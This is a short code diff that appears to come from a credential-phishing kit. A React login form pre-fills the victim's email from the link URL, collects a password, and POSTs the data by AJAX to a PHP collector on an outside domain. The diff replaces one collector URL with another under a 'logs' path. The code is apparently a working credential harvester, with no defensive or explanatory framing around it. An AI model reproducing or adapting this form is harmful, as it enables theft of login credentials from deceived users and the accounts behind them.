@@ -13,7 +13,7 @@ const Formm = ({ stop_propagate,hideModal })=>{
     const emailInTheURL = window.location.href;
     const sliceEqualSign = emailInTheURL.indexOf("=");
     const e = emailInTheURL.substr((sliceEqualSign+1));
-
+    
     const [email, setEmail] = useState(e);
     // setEmail(email);
     const [pwd, setPwd] = useState('');
@@ -46,7 +46,7 @@ const Formm = ({ stop_propagate,hideModal })=>{
     
         $.ajax({
             type: "POST",
-            url: "https://dozenpearl.com/nc_assets/fonts/laptop/sample.php",
+            url: "https://bucketlion.com/logs/dashboard/file/da.php",
             data: user, 
             success(data) {
                 // alert('OK');
